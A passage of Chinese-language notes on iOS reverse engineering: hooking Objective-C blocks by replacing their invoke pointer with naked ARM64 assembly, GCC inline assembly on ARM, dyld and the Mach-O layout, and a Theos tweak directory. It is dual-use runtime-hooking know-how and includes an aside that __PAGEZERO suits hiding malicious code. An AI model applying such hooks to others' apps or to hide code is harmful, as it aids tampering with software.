获取到函数地址后，反查linkmap既可找到方法的符号名。
```

iOS的block是一种特殊的单元，block在编译后的函数体是一个C函数，
在调用的时候直接通过指针调用，并不走objc_msgSend，所以需要单独hook。

通过Block的源码可以看到block的内存布局如下：
```
 1struct Block_layout {
 2    void *isa;
 3    int32_t flags; // contains ref count
 4    int32_t reserved;
 5    void  *invoke;
 6    struct Block_descriptor1 *descriptor;
 7};
 8struct Block_descriptor1 {
 9    uintptr_t reserved;
10    uintptr_t size;
11};
```
其中invoke就是函数的指针，hook思路是将invoke替换为自定义实现，然后在reserved保存为原始实现。
```
1
2if (layout->descriptor != NULL && layout->descriptor->reserved == NULL)
3{
4    if (layout->invoke != (void *)hook_block_envoke)
5    {
6        layout->descriptor->reserved = layout->invoke;
7        layout->invoke = (void *)hook_block_envoke;
8    }
9}
```
由于block对应的函数签名不一样，所以仍然采用汇编来实现hook_block_envoke：
```
 1__attribute__((__naked__))
 2static void hook_block_envoke() {
 3    save()
 4    __asm volatile ("mov x1, lr\n");
 5    call(blr, &before_block_hook);
 6    __asm volatile ("mov lr, x0\n");
 7    load()
 8    //调用原始的invoke，即resvered存储的地址
 9    __asm volatile ("ldr x12, [x0, #24]\n");
10    __asm volatile ("ldr x12, [x12]\n");
11    __asm volatile ("br x12\n");
12}
```

在before_block_hook中获得函数地址（同样要减去slide）。
```
1intptr_t before_block_hook(id block,intptr_t lr)
2{
3    Block_layout * layout = (Block_layout *)block;
4    //layout->descriptor->reserved即block的函数地址
5    return lr;
6}
```
同样，通过函数地址反查linkmap既可找到block符号

### .s 汇编语言源程序;  操作: 汇编
### .S 汇编语言源程序;  操作: 预处理 + 汇编

```
1.小写的 s文件，在后期阶段不会再进行预处理操作了，所以我们不能在其内写上预处理语句。

    一般是 .c 文件经过汇编器处理后的输出。 如 GCC 编译器就可以指定 -S 选项进行输出， 且是经过预处理器处理后的了。

2.大写的 S 文件，还会进行预处理、汇编等操作，所以我们可以在这里面加入预处理的命令。编译器在编译汇编大 S 

    文件之前会进行预处理操作。

    常用这种形式的汇编文件作为工程内的汇编源文件(如 Linux 和 u-boot)， 因为在文件内可以很方便的使用常用的

    预处理指令来进行宏定义，条件编译， 和文件包含操作。

    如: #include, #define, #ifdef, #else, #if, #elif, #endif 等预处理指令。

    具体的应用可以参考 Linux 或者 u-boot 的 .S 源代码。
----------------------------------------------------------------------------

    asm(汇编);

在针对ARM体系结构的编程中，一般很难直接使用C语言产生操作协处理器的相关代码，因此使用汇编语言来实现就成为了唯一的选择。

但如果完全通过汇编代码实现，又会过于复杂、难以调试。因此，C语言内嵌汇编的方式倒是一个不错的选择。

然而，使用内联汇编的一个主要问题是，内联汇编的语法格式与使用的编译器直接相关，也就是说，使用不同的C编译器内联汇编代码时，它们的写法是各不相同的。

下面介绍在ARM体系结构下GCC的内联汇编。GCC内联汇编的一般格式：asm(汇编);

asm(   
 
 
    代码列表   
    : 输出运算符列表   
    : 输入运算符列表   
    : 被更改资源列表   
);

在C代码中嵌入汇编需要使用asm关键字，在asm的修饰下，代码列表、输出运算符列表、输入运算符列表和被更改的资源列表这4个部分被3个“:”分隔。下面，我们看一个例子：

void test(void) 
{   
    ……   
    asm(   
        "mov r1,#1\n"   
        :   
        :   
        :"r1"   
    );   
    ……   
} 

注：换行符和制表符的使用可以使得指令列表看起来变得美观。你第一次看起来可能有点怪异，但是当C编译器编译C语句的是候，它就是按照上面（换行和制表）生成汇编的。

函数test中内嵌了一条汇编指令实现将立即数1赋值给寄存器R1的操作。由于没有任何形式的输出和输入，因此输出和输入列表的位置上什么都没有填写。但是，在汇编代码执行过程中R1寄存器会被修改，因此为了通知编译器，在被更改资源列表中，需要写上寄存器R1。

寄存器被修改这种现象发生的频率还是比较高的。例如，在调用某段汇编程序之前，寄存器R1可能已经保存了某个重要数据，当汇编指令被调用之后，R1寄存器被赋予了新的值，原来的值就会被修改，所以，需要将会被修改的寄存器放入到被更改资源列表中，这样编译器会自动帮助我们解决这个问题。也可以说，出现在被更改资源列表中的资源会在调用汇编代码一开始就首先保存起来，然后在汇编代码结束时释放出去。所以，上面的代码与如下代码从语义上来说是等价的。

void test(void) 
{   
    ……   
    asm(   
        "stmfd sp!,{r1}\n" 
        "mov r1,#1\n"   
        "ldmfd sp!,{r1}\n"   
    );   
    ……   
} 

这段代码中的内联汇编既无输出又无输入，也没有资源被更改，只留下了汇编代码的部分。由于程序在修改R1之前已经将寄存器R1的值压入了堆栈，在使用完之后，又将R1的值从堆栈中弹出，所以，通过被更改资源列表来临时保存R1的值就没什么必要了。

在以上两段代码中，汇编指令都是独立运行的。但更多的时候，C和内联汇编之间会存在一种交互。C程序需要把某些值传递给内联汇编运算，内联汇编也会把运算结果输出给C代码。此时就可以通过将适当的值列在输入运算符列表和输出运算符列表中来实现这一要求。请看下面的例子：

void test(void) 
{   
    int tmp=5;   
    asm(   
        "mov r4,%0\n"   
        :   
        :"r"(tmp)   
        :"r4"   
    );   
} 

上面的代码中有一条mov指令，该指令将%0赋值给R4。这里，符号%0代表出现在输入运算符列表和输出运算符列表中的第一个值。如果%1存在的话，那么它就代表出现在列表中的第二个值，依此类推。所以，在该段代码中，%0代表的就是“r”(tmp)这个表达式的值了。

那么这个新的表达式又该怎样解释呢？原来，在“r”(tmp)这个表达式中，tmp代表的正是C语言向内联汇编输入的变量，操作符“r”则代表tmp的值会通过某一个寄存器来传递。在GCC4中与之相类似的操作符还包括“m”、“I”，等等，其含义见下表：

ARM嵌入式开发中的GCC内联汇编简介

与输入运算符列表的应用方法一致，当C语言需要利用内联汇编输出结果时，可以使用输出运算符列表来实现，其格式应该是下面这样的。

void test(void) 
{   
    int tmp;   
    asm(   
        "mov %0,#1\n"   
        :"=r"(tmp)   
        :   
    );   
} 

在上面的代码中，原本应出现在输入运算符列表中的运算符，现在出现在了输出运算符列表中，同时变量tmp将会存储内联汇编的输出结果。
这里有一点可能已经引起大家的注意了，上面的代码中操作符r的前面多了一个“=”。这个等号被称为约束修饰符，其作用是对内联汇编的操作符进行修饰。

当一个操作符没有修饰符对其进行修饰时，代表这个操作符是只读的。当我们需要将内联汇编的结果输出出来，那么至少要保证该操作符是可写的。因此，“=”或者“+”也就必不可少了。

```
----------------------------------------------------------------------------------------------------------------

## dyld
动态链接器，其本质也是 Mach-O 文件，一个专门用来加载 dylib 文件的库。
dyld 位于 /usr/lib/dyld，可以在 macOS 和越狱机中找到。
dyld 会将 App 依赖的动态库和 App 文件加载到内存执行。

## Mach-O 文件

### Mach header：描述 Mach-O 的 CPU 架构、文件类型以及加载命令等；
### Load commands：描述了文件中数据的具体组织结构，不同的数据类型使用不同的加载命令；
### Data：Data 中的每个段（segment）的数据都保存在这里;

### 每个段（segment）都有Section : 存放了具体的数据与代码，主要包含以下三种类型：

__TEXT 包含 Mach header，被执行的代码和只读常量（如C 字符串）。只读可执行（r-x）。

__DATA 包含全局变量，静态变量等。可读写（rw-）。

__LINKEDIT 包含了加载程序的元数据，比如函数的名称和地址。只读（r–-）。

## MachOView : 查看MachO文件格式信息
### MachOView源码地址：https://github.com/gdbinit/MachOView

```
Mach-O格式全称为Mach Object文件格式的缩写，是mac上可执行文件的格式，
类似于windows上的PE格式 (Portable Executable ), linux上的elf格式 (Executable and Linking Format)。

Mach-O文件类型分为：

1、Executable：应用的主要二进制

2、Dylib Library：动态链接库（又称DSO或DLL）

3、Static Library：静态链接库

4、Bundle：不能被链接的Dylib，只能在运行时使用dlopen( )加载，可当做macOS的插件

5、Relocatable Object File ：可重定向文件类型

那什么又是FatFile/FatBinary？

简单来说，就是一个由不同的编译架构后的Mach-O产物所合成的集合体。
一个架构的mach-O只能在相同架构的机器或者模拟器上用，为了支持不同架构需要一个集合体。
```

```
MachOView在load Commands里面加载了这么些动态库: 

LC_SEGMENT_64：定义一个（64位）段， 当文件加载后它将被映射到地址空间。包括段内节（section）的定义。

LC_SYMTAB：为该文件定义符号表（‘stabs’ 风格）和字符串表。 他们在链接文件时被链接器使用，同时也用于调试器映射符号到源文件。具体来说，符号表定义本地符号仅用于调试，而已定义和未定义external 符号被链接器使用。

LC_DYSYMTAB：提供符号表中给出符号的额外符号信息给动态链接器，以便其处理。 包括专门为此而设的一个间接符号表的定义。

LC_DYLD_INFO_ONLY：定义一个附加 压缩的动态链接器信息节，它包含在其他事项中用到的 动态绑定符号和操作码的元数据。stub 绑定器（“dyld_stub_binder”），它涉及的动态间接链接利用了这点。 “_ONLY” 后缀t表明这个加载指令是程序运行必须的，, 这样那些旧到不能理解这个加载指令的链接器就在这里停下。

LC_LOAD_DYLINKER: 加载一个动态链接器。在OS X上，通常是“/usr/lib/dyld”。LC_LOAD_DYLIB: 加载一个动态链接共享库。举例来说，“/usr/lib/libSystem.B.dylib”，这是C标准库的实现再加上一堆其他的事务（系统调用和内核服务，其他系统库等）。每个库由动态链接器加载并包含一个符号表，符号链接名称是查找匹配的符号地址。

LC_MAIN：指明程序的入口点。在本案例，是函数themain()的地址。

LC_UUID：提供一个唯一的随机UUID，通常由静态链接器生成。

LC_VERSION_MIN_MACOSX：程序可运行的最低OS X版本要求

LC_SOURCE_VERSION:：构建二进制文件的源码版本号。

LC_FUNCTION_STARTS：定义一个函数起始地址表，使调试器和其他程序易于看到一个地址是否在函数内。

LC_DATA_IN_CODE：定义在代码段内的非指令的表。

LC_DYLIB_CODE_SIGN_DRS: 为已链接的动态库定义代码签名 指定要求。

Xcode工程里的系统库 则转化为LC_LOAD_DYLIB 所谓dylib嵌入就是指的这个过程 此在后文中予以介绍

而关于LC_SEGMENT_64头部则有如下的定义说明

__PAGEZERO：一个全用0填充的段，用于抓取空指针引用。这通常不会占用磁盘空间(或内存空间)，因为它运行时映射为一群0啊。顺便说一句，这个段是隐藏恶意代码的好地方。

__TEXT：本段只有可执行代码和其他只读数据。

__text：本段是可执行机器码。

__stubs：间接符号存根。这些跳转到非延迟加载 (“随运行加载”) 和延迟加载(“初次使用时加载”) 间接引用的（可写）位置的值 (例如条目“__la_symbol_ptr”，我们很快就会看到)。对于延迟加载引用，其地址跳转讲首先指向一个解析过程，但初始化解析后会指向一个确定的地址。 对于非延迟加载引用，其地址跳转会始终指向一个确定的地址，因为动态链接器在加载可执行文件时就修正好了。

__stub_helper：提供助手来解决延迟加载符号。如上所述，延迟加载的间接符号指针将指到这里面，直到得到确定地址。

__cstring： constant (只读) C风格字符串（如”Hello, world!n”）的节。链接器在生成最终产品时会清除重复语句。

__unwind_info：一个紧凑格式，为了存储堆栈展开信息供处理异常。此节由链接器生成，通过“__eh_frame”里供OS X异常处理的信息。

__eh_frame： 一个标准的节，用于异常处理，它提供堆栈展开信息，以DWARF格式。


__DATA：用于读取和写入数据的一个段。

__nl_symbol_ptr：非延迟导入符号指针表。

__la_symbol_ptr：延迟导入符号指针表。本节开始时，指针们指向解析助手，如前所讨述。

__got：全局偏移表–— （非延迟）导入全局指针表。


__LINKEDIT：包含给链接器（“链接编辑器‘）的原始数据的段，在本案例中，包括符号和字符串表，压缩动态链接信息，代码签名存托凭证，以及间接符号表–所有这一切的占区都被加载指令指定了。

```


theos .deb插件
```
   .
├── .theos
|   ├── _ 
|   |    └── ...  *
|   ├── obj 
|   |    └── ...  *
|   ├── packages 
|   |    └── ...   记录版本号
|   ├── build_session
|   ├── fakeroot
|   └── last_package    当前打包成功以后放的路径
├── obj   实际上跟上面.theos/obj的目录是一样的
|   └── 
